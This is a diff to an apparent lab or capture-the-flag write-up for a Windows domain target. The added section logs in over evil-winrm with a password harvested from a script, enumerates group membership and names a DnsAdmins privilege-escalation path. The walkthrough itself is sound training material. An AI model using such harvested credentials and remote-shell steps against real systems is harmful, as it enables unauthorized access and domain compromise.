@@ -420,6 +420,66 @@ SerializationVersion: 1.1.0.1
 
 Identified a new set of credentials in the powershell script: `ryan:Serv3r4Admin4cc123!`
 
+Signed into target machine with ryan's credentials:
+
+```bash
+evil-winrm -i 10.10.10.169 -u ryan -p Serv3r4Admin4cc123!
+```
+
+Found a file titled `note.txt` in the user's directory:
+
+```bash
+*Evil-WinRM* PS C:\Users\ryan\Desktop> type note.txt
+Email to team:
+
+- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
+```
+
+## DNSAdmins Group - Privilege Escalation
+
+Checked what groups the user ryan was a member of:
+
+```bash
+*Evil-WinRM* PS C:\Users\ryan\Desktop> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes
+========================================== ================ ============================================== ===============================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
+MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+```
+
+We can see that the user `ryan` is a member of the group `DnsAdmins`. A search online shows that we can perform a [privilege escalation attack](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise) to SYSTEM by exploiting this group membership.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
